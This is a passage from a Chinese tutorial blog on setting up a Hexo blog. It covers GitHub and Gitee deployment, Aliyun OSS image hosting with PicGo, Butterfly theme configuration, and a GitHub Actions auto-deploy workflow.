class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改_config.yml的部署配置，增加一个gitee</span></span><br><span class="line">deploy:</span><br><span class="line">- type: &#x27;git&#x27;</span><br><span class="line">  repo: https:[GithubUsername]//[GithubToken]@github.com/[GithubUsername]/[GithubBlogRepo].git</span><br><span class="line">  branch: main # 注意github初始化仓库叫main</span><br><span class="line">- type: &#x27;git&#x27;</span><br><span class="line">  repo: https://[GiteeUsername]:[GiteeToken]@github.com/[GiteeUsername]/[GiteeBlogRepo].git</span><br><span class="line">  branch: main # gitee还是初始化仓库还是叫master，要用main需要修改</span><br></pre></td></tr></table></figure><p>与github不同，gitee需要申请gitee page（在服务中申请）。gitee的发布仓库名应该为用户名（这与github不同，少了后缀），gitee page会自动生成对应的gitee.io 方便访问。</p><blockquote><p>注意Gitee部署完成之后还要去官网点击服务</p></blockquote><h2 id="4everland"><a href="#4everland" class="headerlink" title="4everland"></a>4everland</h2><p>可以直接通过github的io库自动实现部署。只需要在4everland中导入即可。</p><h1 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>阿里云OSS超香的，如果不用图床，整个博客就太大了，不方便使用Github Action，有其是如果使用Gitee的话，空间就更捉襟见肘了。</p><blockquote><p>图床不是必须的！！！背景等图片可以通过网络地址引用，自己的图片如果不大，可以通过gitee(500M压力不大)或github仓库的形式导入。</p></blockquote><p>可以通过直接使用图片网络地址的方式读取网络中的图片，但是并不是所有的网络图片都可以访问，有些图片虽然复制了地址可以在游览器打开，但是发布到博客上就无法显示。当前百度的搜索图片大多是可以的。</p><h2 id="遇事不决先买阿里云"><a href="#遇事不决先买阿里云" class="headerlink" title="遇事不决先买阿里云"></a>遇事不决先买阿里云</h2><p>阿里云官网-&gt;产品-&gt;存储-&gt;对象存储OSS。购买标准（LRS）存储包-中国大陆通用-40G即可。</p><p>进入管理控制台，创建Bucket（刚买的话在右上角的位置），名字没要求，选择一个近的位置。<img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image-20220408234919251.png" alt="image-20220408234919251"></p><h3 id="创建AccessKey"><a href="#创建AccessKey" class="headerlink" title="创建AccessKey"></a>创建AccessKey</h3><p>右上角头像AccessKey管理-&gt;创建AccessKey（生成的钥匙码最好保存一下，不然之后又要手机验证）。</p><h2 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h2><h4 id="PicGo设置"><a href="#PicGo设置" class="headerlink" title="PicGo设置"></a>PicGo设置</h4><p>把不要的图床取消。</p><h5 id="设置Server"><a href="#设置Server" class="headerlink" title="设置Server"></a>设置Server</h5><p>端口号设置为36677（这步的操作主要是为了和Typora联动，后面会扩展一个Typora）</p><h4 id="图床设置"><a href="#图床设置" class="headerlink" title="图床设置"></a>图床设置</h4><p>由于本站只配置了阿里云，所以介绍阿里云的配置</p><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image-20220408235653146.png" alt="image-20220408235653146"></p><p>keyId和KeySecret为刚刚保存的AccessKey。</p><p>设定的存储空间名：入口 阿里云官网-&gt;产品-&gt;存储-&gt;对象存储OSS-&gt;控制台-&gt; Bucket列表，这里可看到(其实就是刚刚设置的Bucket名称)</p><p>确认存储区域：点击指定的Bucket-&gt;概览，外网访问对应的Endpoint，这里.aliyuncs.com的后缀需要去除。就完成了配置。之后拖入图片验证一下是否成功。</p><h5 id="联动Typora"><a href="#联动Typora" class="headerlink" title="联动Typora"></a>联动Typora</h5><p>偏好设置-&gt;图像</p><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image-20220409000448734.png" alt="image-20220409000448734"></p><p>PicGo路径为PicGo的exe执行文件的位置，需要选到它。之后验证图片上传选项。之后将图片复制到Typora中会自动上传到PicGo。</p><h1 id="页面设置"><a href="#页面设置" class="headerlink" title="页面设置"></a>页面设置</h1><blockquote><p>对应front-matter</p></blockquote><p>注意事项:</p><ol><li>标签和分类通过- 标签名换行的方式构建。这样才能多标签和分类共存。</li><li>非原创最好加一个copyright: false 。尊重原作者。现在还能单独设置版权</li><li>cover: img 为每个页面设置封面图片</li></ol><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><p>将需要的主题克隆到themes文件夹下，通过修改_config.yaml文件中的themes选项来进行配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">_config.yaml中的theme</span></span><br><span class="line">theme: 对应的主题名字</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">并且最好拷贝主题中的配置到hexo根目录下，改名为对应的_config.butterfly.yml</span></span><br></pre></td></tr></table></figure><h2 id="butterfly常用配置"><a href="#butterfly常用配置" class="headerlink" title="butterfly常用配置"></a>butterfly常用配置</h2><h3 id="顶部图"><a href="#顶部图" class="headerlink" title="顶部图"></a>顶部图</h3><p>需要设置disable_top_img为false</p><table><thead><tr><th>配置</th><th>功能</th></tr></thead><tbody><tr><td>index_img</td><td>主页的top_img</td></tr><tr><td>default_top_img</td><td>默认的top_img，当页面没有配置时显示</td></tr><tr><td>archive_img</td><td>归档页的top_img</td></tr><tr><td>tag_img</td><td>tag子页</td></tr><tr><td>tag_per_img</td><td>tag子页面的top_img，可配置每个tag的top_img</td></tr><tr><td>category_img</td><td>category对应图</td></tr><tr><td>category_per_img</td><td>category子页对应的图</td></tr><tr><td>其他页面(自建页面，文章页)</td><td>需要到对应页面的front-matter(就是hexo n生成的那部分东西)，对应页面设置</td></tr></tbody></table><h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3><p>对应博客中的各个小标识符号，如github的图标，邮箱图标等，都可以在<a href="https://fontawesome.com/icons/envelope?s=solid">Font Awesome</a>网站找到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fab fa-github # 表示的是fa-brands fa-github</span><br></pre></td></tr></table></figure><h3 id="需要插件支持"><a href="#需要插件支持" class="headerlink" title="需要插件支持"></a>需要插件支持</h3><p>Hexo会自动合并的_config.yml和 _config.butterfly.yml里的配置。具体的配置需要需要查看友链butterfly。这里只介绍几个有多个选项的配置。</p><h4 id="评论系统"><a href="#评论系统" class="headerlink" title="评论系统"></a>评论系统</h4><p>使用了livere。好处是需要登入才能评论，可以过滤一些垃圾信息。</p><p>在Comments System部分，use设置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use: Livere</span><br></pre></td></tr></table></figure><p>livere需要去它的官网注册。然后就可以获取uid：<img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image-20220409000828847.png" alt="image-20220409000828847"></p><p>只需要在config_butterfly.yml中对应的livere项中填入uid即可。</p><h4 id="搜索系统"><a href="#搜索系统" class="headerlink" title="搜索系统"></a>搜索系统</h4><blockquote><p>使用本地搜索</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要安装插件</span></span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><h4 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><h1 id="自动部署"><a href="#自动部署" class="headerlink" title="自动部署"></a>自动部署</h1><p>主要是为了利用github来备份博客源码实现多端同步，同时也能够实现多站点发布。感觉友链forever97提供的教学教学援助。</p><h2 id="创建私有仓库"><a href="#创建私有仓库" class="headerlink" title="创建私有仓库"></a>创建私有仓库</h2><p>创建一个私有仓库来存放Hexo源码，就是正常的github的构建。</p><blockquote><p>使用私有仓库是因为Github Actions的操作其实就是构建了一个类docker来自动完成完成整个Hexo构建的过程，所以需要给它权限来访问我们的github，这个权限泄露了，自己的github也就泄露了。</p></blockquote><h2 id="Github-Token"><a href="#Github-Token" class="headerlink" title="Github Token"></a>Github Token</h2><p>用来代替密码的保密方式，可以直接通过Token作为密码来访问自己的github。这里用Token主要就是为了安全。</p><p>⚠️无法使用ssh密钥，因为Github Actions操作的性质，每次都要重新生成密钥显然是不合适的</p><p>在github的Settings中选择 Developer Settings -&gt; Personal access tokens -&gt; generate new token，token名字任意，勾选上repo项。</p><blockquote><p>⚠️Token只有在生成的那一刻会显示，所以必须要复制下来，不然之后就用不了又要重新生成了。</p></blockquote><h2 id="Gitee-Token"><a href="#Gitee-Token" class="headerlink" title="Gitee Token"></a>Gitee Token</h2><p>头像(右上角) -&gt; 设置 -&gt; 私人令牌 -&gt; 生成新令牌。同样要保存好这个Token。</p><h2 id="配置-config-yml"><a href="#配置-config-yml" class="headerlink" title="配置_config.yml"></a>配置_config.yml</h2><p>修改部署部分代码，这部分也是本地部署时候需要的，即使不使用Github Actions也是需要配置的，用来发布Hexo，如果不适用Action操作，直接本地进行源码的部署，可以使用ssh密钥的形式。考虑到Actions就需要使用Token：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo:</span><br><span class="line">    gitHub: https://[GithubToken]@github.com/[GithubUsername]/[GithubBlogRepo].git</span><br><span class="line">    gitee: https://[GiteeToken]@gitee.com/[GiteeUsername]/[GiteeBlogRepo].git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><h2 id="配置gitignore"><a href="#配置gitignore" class="headerlink" title="配置gitignore"></a>配置gitignore</h2><p>因为Action会构建一个类docker环境，自己会安装指定的node环境，所以这里需要将本地的环境取消跟踪，可以直接复制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">.deploy_git*/</span><br><span class="line">.idea # 自己编辑器生成的文件最好也取消跟踪</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p> ⚠️需要注意，要删除<strong>主题文件</strong>中的.git文件，git然后包含了子git库会从别处引用，导致本地上传到github的时候没有这个主题库，直接删了这个.git，那么这个主题就不构成git仓库了。</p></blockquote><h2 id="配置Actions"><a href="#配置Actions" class="headerlink" title="配置Actions"></a>配置Actions</h2><p>需要在Hexo根目录下创建.github&#x2F;workflows文件夹，并构建yaml文件，名字可以随意，本站使用autodeploy.yml作为入口。直接照搬了forever97同学的配置，只需要修改git的用户名和邮箱：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当有改动推送到master分支时，启动Action</span></span><br><span class="line">name: 自动部署</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">  push: # 设置了每次提交git版本的时候都会执行</span><br><span class="line">    branches:</span><br><span class="line">      - main #2020年10月后github新建仓库默认分支改为main，注意更改</span><br><span class="line"></span><br><span class="line">  release:</span><br><span class="line">    types:</span><br><span class="line">      - published</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  deploy:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">    - name: 检查分支</span><br><span class="line">      uses: actions/checkout@v2</span><br><span class="line">      with:</span><br><span class="line">        ref: main #2020年10月后github新建仓库默认分支改为main，注意更改</span><br><span class="line"></span><br><span class="line">    - name: 安装 Node</span><br><span class="line">      uses: actions/setup-node@v1</span><br><span class="line">      with:</span><br><span class="line">        node-version: &quot;12.x&quot;</span><br><span class="line"></span><br><span class="line">    - name: 安装 Hexo</span><br><span class="line">      run: |</span><br><span class="line">        export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="line">        npm install hexo-cli -g</span><br><span class="line">    - name: 缓存 Hexo</span><br><span class="line">      uses: actions/cache@v1</span><br><span class="line">      id: cache</span><br><span class="line">      with:</span><br><span class="line">        path: node_modules</span><br><span class="line">        key: $&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles(&#x27;**/package-lock.json&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">    - name: 安装依赖</span><br><span class="line">      if: steps.cache.outputs.cache-hit != &#x27;true&#x27;</span><br><span class="line">      run: |</span><br><span class="line">        npm install --save</span><br><span class="line">    - name: 生成静态文件</span><br><span class="line">      run: |</span><br><span class="line">        hexo clean</span><br><span class="line">        hexo generate</span><br><span class="line">    - name: 用户名</span><br><span class="line">      run: |</span><br><span class="line">        git config --global user.name &quot;forever97&quot;</span><br><span class="line">    - name: 邮箱</span><br><span class="line">      run: |</span><br><span class="line">        git config --global user.email &quot;857426255@qq.com&quot;</span><br><span class="line">    #- name: 克隆静态文件仓库</span><br><span class="line">      #run: |</span><br><span class="line">        #git clone git@github.com:forever97/forever97.github.io.git .deploy_git</span><br><span class="line">        # =====注意.deploy_git前面有个空格=====</span><br><span class="line">        # clone 静态文件仓库，防止 Hexo 推送时覆盖整个静态文件仓库，只推送有更改的文件</span><br><span class="line">    - name: 部署</span><br><span class="line">      run: |</span><br><span class="line">        hexo deploy</span><br></pre></td></tr></table></figure><p>之后只需要将源码push到指定的私有库，然后看看Actions按钮是否启动了了一个Actions就完事了。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol><li>依靠github库来保存源文件的时候，本地的预览就不太好用了，要安装本地环境就会改动package-lock的信息，多了不必要的更新，哎，愁呀！！</li><li>博客还不能被搜索引擎检索，这好像是需要域名才能进行的。</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
